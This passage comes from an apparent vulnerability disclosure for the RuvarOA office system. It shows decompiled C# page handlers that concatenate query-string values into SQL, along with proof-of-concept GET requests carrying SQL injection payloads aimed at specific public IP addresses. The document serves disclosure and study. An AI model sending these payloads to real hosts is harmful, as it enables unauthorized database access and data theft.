D62D-dd9gpJXS9Se0GaY"><img width="1062" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302583014-1df11c8c-a3df-4d32-9615-1c3d308a4b2a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODMwMTQtMWRmMTFjOGMtYTNkZi00ZDMyLTk2MTUtMWMzZDMwOGE0YjJhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFkNzI2MTc2ZDVhM2IzN2VlYzVjOTBiYTQ3MzY2NzY1YjQ5NDRiOTdlNDI0OWZlMjM2OGE0NTI0YTViNmQwMjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.K3Gp51jULlsBLt_-Vu8vJEaD62D-dd9gpJXS9Se0GaY" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-12" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-12"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_work_print within the DLL file /RuvarOA/bin/WorkFlow.dll</p>
<pre><code>public class wf_work_print : Page
{
    protected HtmlGenericControl divContent;

    protected void Page_Load(object sender, EventArgs e)
    {
        string text = ((Page)this).Request.QueryString["AutoPrint"];
        if (Validate.isNullOrSpace(text))
        {
            text = "0";
        }
        string text2 = ((Page)this).Request.QueryString["idlist"];
        if (Validate.isNullOrSpace(text2))
        {
            text2 = "0";
        }
        string text3 = ((Page)this).Request.QueryString["dbname"];
        if (Validate.isNullOrSpace(text3))
        {
            text3 = "RuvarOA";
        }
        string[] array = text2.Split(new char[1] { ',' });
        BackUpDB backUpDB = new BackUpDB(text3);
        string text4 = "";
        for (int i = 0; i &lt; array.Length; i++)
        {
            if (!Validate.isNullOrSpace(array[i]) &amp;&amp; array[i] != "0")
            {
                DataView dataView = backUpDB.QueryDataView("select  top 1 m_content from office_missive_search where office_missive_id in (" + array[i] + ") ");
                if (dataView.Count &gt; 0)
                {
                    text4 = ((!(text4 != "")) ? (text4 + "&lt;div class=\"FirstPage\"&gt;" + dataView[0]["m_content"].ToString() + "&lt;/div&gt;") : (text4 + "&lt;div class=\"NextPage\"&gt;" + dataView[0]["m_content"].ToString() + "&lt;/div&gt;"));
                }
                dataView.Dispose();
            }
        }
        ((HtmlContainerControl)divContent).InnerHtml = text4;
        JS.ScriptStart();
        ((Page)this).Response.Write("var AutoPrint = '" + text + "'; \n ");
        JS.ScriptEnd();
    }
}
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["idlist"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_get_fields_approve.aspx</h3><a id="user-content-wf_get_fields_approveaspx" class="anchor" aria-label="Permalink: wf_get_fields_approve.aspx" href="#wf_get_fields_approveaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-13" class="anchor" aria-label="Permalink: path" href="#path-13"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkFlow/wf_get_fields_approve.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-13" class="anchor" aria-label="Permalink: POC" href="#poc-13"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkFlow/wf_get_fields_approve.aspx?template_id=@@version HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302583460-20ec40fb-4b27-4c2d-9aa0-3e1b09c40d7e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODM0NjAtMjBlYzQwZmItNGIyNy00YzJkLTlhYTAtM2UxYjA5YzQwZDdlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThlNTAwODYyYTYzZWRlNTczN2Y2N2NhZjFhZWQ5MjRiMzQ2NDg2MTQ3YTFmMTdlYmNhZDc1OGU1YTUzZDViODkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.rUse82voBvw1kP-t5ZgUJVMFzAfQL7Pi1ahTpdn09bU"><img width="1062" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302583460-20ec40fb-4b27-4c2d-9aa0-3e1b09c40d7e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODM0NjAtMjBlYzQwZmItNGIyNy00YzJkLTlhYTAtM2UxYjA5YzQwZDdlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPThlNTAwODYyYTYzZWRlNTczN2Y2N2NhZjFhZWQ5MjRiMzQ2NDg2MTQ3YTFmMTdlYmNhZDc1OGU1YTUzZDViODkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.rUse82voBvw1kP-t5ZgUJVMFzAfQL7Pi1ahTpdn09bU" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-13" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-13"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_get_fields_approve within the DLL file /RuvarOA/bin/WorkFlow.dll</p>
<pre><code>public class wf_get_fields_approve : Page
{
    protected HtmlForm Form1;

    protected ListBox ddlFields;

    protected void Page_Load(object sender, EventArgs e)
    {
        //IL_00df: Unknown result type (might be due to invalid IL or missing references)
        //IL_00e9: Expected O, but got Unknown
        string text = ((Page)this).Request.QueryString["template_id"];
        if (Validate.isNullOrSpace(text))
        {
            text = "0";
        }
        DataView dataView = SqlHelper.QueryView("select top 1 * from office_missive_template where office_missive_template_id=" + text);
        if (dataView.Count &gt; 0)
        {
            string text2 = dataView[0]["mt_approve_value"].ToString();
            string text3 = dataView[0]["mt_approve_text"].ToString();
            string[] array = text2.Split(new char[1] { ',' });
            string[] array2 = text3.Split(new char[1] { ',' });
            for (int i = 0; i &lt; array.Length; i++)
            {
                if (!Validate.isNullOrSpace(array[i]))
                {
                    ((ListControl)ddlFields).Items.Add(new ListItem(array2[i], array[i]));
                }
            }
        }
        dataView.Dispose();
    }
}
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["template_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_work_form_save.aspx</h3><a id="user-content-wf_work_form_saveaspx" class="anchor" aria-label="Permalink: wf_work_form_save.aspx" href="#wf_work_form_saveaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-14" class="anchor" aria-label="Permalink: path" href="#path-14"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkFlow/wf_work_form_save.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-14" class="anchor" aria-label="Permalink: POC" href="#poc-14"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkFlow/wf_work_form_save.aspx?office_missive_id=@@version HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302583764-06df9733-1534-41e1-ac42-8eb4f0cd0ef6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODM3NjQtMDZkZjk3MzMtMTUzNC00MWUxLWFjNDItOGViNGYwY2QwZWY2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWIwNmVjNTBkZGExOTMyYjQ1MjQwNTRjZjIxOGEzZjQxZDhlOGYxZmZlMjQ0Y2Y4YWQxYzZmOTY1NzcyN2YxODgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.k4nVHpRwS_HCzbwj5_4opOpdEtwYkCHSD9xABa75m-0"><img width="1062" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302583764-06df9733-1534-41e1-ac42-8eb4f0cd0ef6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODM3NjQtMDZkZjk3MzMtMTUzNC00MWUxLWFjNDItOGViNGYwY2QwZWY2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWIwNmVjNTBkZGExOTMyYjQ1MjQwNTRjZjIxOGEzZjQxZDhlOGYxZmZlMjQ0Y2Y4YWQxYzZmOTY1NzcyN2YxODgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.k4nVHpRwS_HCzbwj5_4opOpdEtwYkCHSD9xABa75m-0" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-14" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-14"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_work_form_save within the DLL file /RuvarOA/bin/WorkFlow.dll</p>
<pre><code>public class wf_work_form_save : Page
{
    protected HtmlForm form1;

    protected Literal m_content;

    protected void Page_Load(object sender, EventArgs e)
    {
        string text = ((Page)this).Request.QueryString["office_missive_id"];
        string text2 = ((Page)this).Request.QueryString["dbname"];
        string text3 = ((Page)this).Request.QueryString["tablename"];
        if (Validate.isNullOrSpace(text2))
        {
            text2 = "RuvarOA";
        }
        if (Validate.isNullOrSpace(text3))
        {
            text3 = "office_missive_search";
        }
        if (Validate.isNullOrSpace(text))
        {
            text = "0";
        }
        if (text == "0")
        {
            ((Page)this).Response.End();
        }
        BackUpDB backUpDB = new BackUpDB(text2);
        DataView dataView = backUpDB.QueryDataView("select top 1 m_title,m_content from " + text3 + " where office_missive_id=" + text);
        if (dataView.Count &gt; 0)
        {
            ((Page)this).Title = dataView[0]["m_title"].ToString();
            m_content.Text = dataView[0]["m_content"].ToString();
        }
        dataView.Dispose();
    }
}
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["office_missive_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">WorkPlanAttachDownLoad.aspx</h3><a id="user-content-workplanattachdownloadaspx" class="anchor" aria-label="Permalink: WorkPlanAttachDownLoad.aspx" href="#workplanattachdownloadaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-15" class="anchor" aria-label="Permalink: path" href="#path-15"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkPlan/WorkPlanAttachDownLoad.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-15" class="anchor" aria-label="Permalink: POC" href="#poc-15"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27%20and%20%28@@version%29%3E0%29-- HTTP/1.1
Host: 121.8.91.35:89
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302584116-52a4aa30-09d2-4283-8671-6ea0dd8c7c82.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODQxMTYtNTJhNGFhMzAtMDlkMi00MjgzLTg2NzEtNmVhMGRkOGM3YzgyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWUzNGNjYjc3MzBmMTkzZDEwOGQzODBmMDJlZmE0MmY3YWZiMDk3MDI1NTcyMWExMDFiNzUyYzZjMjA3N2YxNDImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jdeOIYh4C_o9ANG82ge-LdqhNeYlQZ2_Lil2-LvWpFE"><img width="1062" alt="image" 